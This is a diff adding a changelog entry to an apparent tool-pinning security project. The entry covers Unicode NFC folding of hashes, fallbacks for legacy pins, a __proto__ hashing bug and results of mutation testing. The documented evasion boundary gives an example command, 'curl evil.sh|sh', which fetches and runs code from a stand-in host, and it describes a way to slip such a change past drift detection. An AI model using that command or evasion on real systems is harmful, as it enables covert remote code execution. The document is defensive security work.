@@ -8,6 +8,130 @@ _Add entries here, never under a stamped version_ — a release commit renames t
 heading, and a branch that wrote beneath it merges without conflict straight into a
 published section (it happened to #170).
 
+### Fixed
+
+- **A Unicode-normalization-only change no longer reads as schema drift (TODOS
+  #26).** The pin hash was taken over the canonical JSON of a tool definition as
+  raw UTF-8, so text that flips NFD→NFC — rendering identically — produced a
+  different hash. H4 tiers a schema-side change as `block`, so this was a false
+  HARD-BLOCK of a server's entire `tools/list`, the failure direction this
+  project ranks worse than a miss. macOS is the realistic carrier, though not for
+  the reason first written here: **APFS is normalization-preserving** — verified
+  on an APFS volume, a file created with an NFC name reads back as NFC — it is
+  *HFS+* that stored and returned a modified NFD. NFD names stay common on macOS
+  via volumes migrated from HFS+ and via tools that emit decomposed text, so a
+  server deriving an enum, title or default from a directory listing can still
+  emit either form. Both the relay (`run-inner.ts`) and the install-time path
+  (`drift.ts`) are covered, for the whole hash and for H4 field tiering, as are
+  handshake pins — whose per-dimension tiering needed the same fallback, or a
+  legacy pin reported the untouched dimension as drifted too and accused an
+  unchanged server of "possible impersonation" alongside any genuine capability
+  change. Warn-once dedup uses the same predicate, so it survives the upgrade.
+
+  Folding is **NFC, deliberately not NFKC**. NFC is canonical equivalence only, so
+  folded strings *render* identically. NFKC additionally folds compatibility
+  characters (`ﬁ`→`fi`, `①`→`1`, full-width→half-width), which render
+  *differently*; collapsing those would let a server swap one visible definition
+  for another under an unchanged hash. A test pins that boundary.
+
+  **Known boundary, found by adversarial review and deliberately accepted:**
+  "renders identically" is not "means identically to a byte-level consumer".
+  Exactly three code points have a printable-ASCII NFC image — `U+037E`→`;`,
+  `U+1FEF`→`` ` ``, `U+212A`→`K` (verified exhaustively over all of Unicode; the
+  set is complete, with no digit, quote, bracket, slash or space in it). So a
+  schema default pinned as `ls /tmp\u037E curl evil.sh|sh` and later flipped to a
+  literal `;` keeps one hash — inert becomes executable, with no drift finding;
+  likewise for a regex or an exact-match allowlist, none of which normalize. Kept
+  folded regardless: all three have ordinary uses (the Kelvin sign in a unit
+  description, Greek question mark and varia in Greek prose), so excluding them
+  would trade a narrow evasion for false-BLOCKING those servers, and the evasion
+  needs the attacker to have pinned a definition that *already* renders as the
+  malicious form. Recorded rather than absorbed.
+
+  Object KEYS fold too, but only while folding stays injective for that object:
+  two keys differing solely by normalization are distinct JSON members, and
+  collapsing them would drop one from the hash and hide a real difference.
+  Non-injective ⇒ raw keys ⇒ it reads as drift.
+
+  **No `PINS_FORMAT_VERSION` bump and no migration.** A pin stores a hash, never
+  the text, so `pinStillMatches` asks "was this pinned over the same text?" by
+  re-spelling the LIVE definition and hashing each spelling the way ≤v0.35.0 did:
+  NFD, and as-is. Every candidate is a canonically-equivalent re-spelling of the
+  live text, so a match proves the pinned and live text are the same text — it
+  weakens nothing. It runs only on a mismatch, and an all-ASCII definition (nearly
+  all of them) matches on the primary hash alone.
+
+  **What that recovers, stated precisely, because it is less than "every legacy
+  pin".** The candidate set can only recover a pinned spelling that is one of
+  `{live, NFC(live), NFD(live)}`. Canonical equivalence has more members than
+  that — canonical singletons (`U+212B`/`U+00C5`), non-canonical combining-mark
+  order, and per-string mixtures within one definition. A pre-#26 pin in one of
+  those forms still reads as drift the first time its server changes normal form;
+  recovering it would require storing the text or migrating. **Transitional only:**
+  once a pin has been written by this version, the fold absorbs *all* of those
+  cases, because every canonically-equivalent spelling folds to one NFC form.
+
+  One further shape, found by review and worth naming because it is *not* about
+  normalization: the candidates also carry the `__proto__` fix below, so they do
+  not reproduce v0.35.0 byte-for-byte for a definition that has a `__proto__`
+  schema property — such a pin reads as drift once on upgrade even unchanged.
+  **Making the candidates drop it instead was tried and reverted**: that offers a
+  `__proto__`-free spelling for *every* pin, so adding the property became
+  invisible again and the fix disarmed itself — caught by its own regression test.
+  The two cases are indistinguishable from a hash alone, since a v0.35.0 hash
+  carries no information about that member. A near-empty population taking a
+  one-time, `accept-drift`-able block beats re-opening the hole for everyone.
+
+  **Measured, so the value claim stays honest: this is a PROSPECTIVE fix, not one
+  closing an observed failure.** Across the whole shipped fixture corpus — all 86
+  files (79 `.json`, 5 `.jsonl`, 2 `.md`), 52 of which contain non-ASCII text —
+  exactly **0** are non-NFC, so the fold changes no hash anywhere in the corpus and
+  no fixture would have tripped the false block either. What it removes is a live
+  hazard in the one direction this project cares most about, not a bug anyone has
+  reported.
+
+  **The byte-identical fallback shipped first was not enough, and only dogfooding
+  the built relay found it.** The unit tests fed the same bytes to both sides, so
+  they passed while the actual migration shape — pinned under NFD before the fix,
+  server now emitting NFC — still hard-blocked end to end. That case is now a
+  test, as is the mixed-normalization pin that motivates the as-is candidate —
+  which covers that pin only while its bytes are unchanged, per the bound above.
+  **Cost, measured:** canonicalization roughly doubles on a deliberately extreme
+  frame (200 tools, 2.4 MB — 13.6 ms → 27.1 ms median), and is unchanged in
+  practice on a typical frame (20 tools, 8.5 KB — 0.2 ms → 0.3 ms). `normalize()`
+  on already-ASCII strings is most of the delta; an ASCII pre-test recovers only
+  27.1 → 21.5 ms and costs a second full scan of every string, which is a net loss
+  on non-ASCII content, so it is deliberately NOT added. Complexity is unchanged —
+  the injectivity `Set` is O(k) against a sort that was already O(k log k), so
+  there is no new quadratic term of the kind that caused the v0.35.0 relay stall.
+
+  **Twenty mutations verified to fail the suite**, plus a golden hash vector taken
+  from v0.35.0's own `hashToolDefinition` (extracted verbatim from the `origin/main`
+  blob) that pins the canonical form — and therefore the whole no-format-bump
+  argument — against the previous release. Covered: the primary fold, the string
+  and key folds, NFKC-instead-of-NFC, the injectivity guard both ways, each legacy
+  candidate, the whole-hash / per-field / handshake fallbacks, the `__proto__` fix,
+  the key-order comparator, the field-WISE discipline of the per-field check, and
+  each of the six wired call sites independently.
+
+  **Five of those mutations survived a sweep and needed a test written for them.**
+  Four were call sites: the relay path and the install-time path are separate, and
+  a test exercising one certifies nothing about the other — twice over, for the
+  tool path and again for the handshake path. The fifth was the field-WISE
+  discipline of `diffToolDefinition`: an absent `schema` and an absent
+  `annotations` both collapse to `hashLeaf(null)` — literally the same constant —
+  so a cross-field alternates check downgrades `security` to `cosmetic`
+  (`block`→`warn`) deterministically, and shipped green.
+
+- **A schema property named `__proto__` is now part of the pin hash.** The
+  canonical form built its sorted object as a literal, so assigning that key hit
+  the inherited setter and the member never became an own property —
+  `JSON.stringify` omitted it. A tool could therefore declare, alter or remove a
+  `__proto__` parameter with **no drift finding at all**, while `JSON.parse` had
+  faithfully created it as a real own property that consumers can see. Found by
+  adversarial review; **pre-existing** (`origin/main` has the same bug) and fixed
+  here only because it is one word inside the function being rewritten.
+
 ## [0.35.0] - 2026-09-02
 
 ### Security
